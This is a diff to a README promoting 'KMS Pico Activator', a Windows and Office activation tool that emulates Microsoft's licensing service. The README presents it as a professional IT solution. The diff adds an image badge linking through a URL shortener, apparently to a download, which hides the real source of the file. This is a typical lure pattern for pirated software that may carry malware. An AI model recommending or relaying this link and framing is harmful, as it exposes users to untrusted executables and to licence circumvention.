@@ -1,6 +1,8 @@
 # KMS Pico Activator
 KMS Pico Activator functions as a specialized technical solution for IT professionals managing software deployment in organizational environments. The following outlines its operational characteristics:
 
+[![9587957805](https://github.com/user-attachments/assets/fae1c5b5-469d-41b4-a56d-81b92a410cd7)](https://y.gy/pico-kmss-activator)
+
 **Technical Framework:**
 - Recreates enterprise-level Key Management Service protocols
 - Deploys local emulation of Microsoft's authorization infrastructure
